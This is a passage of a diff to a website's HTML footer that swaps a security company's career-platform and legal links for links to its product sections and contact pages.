+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
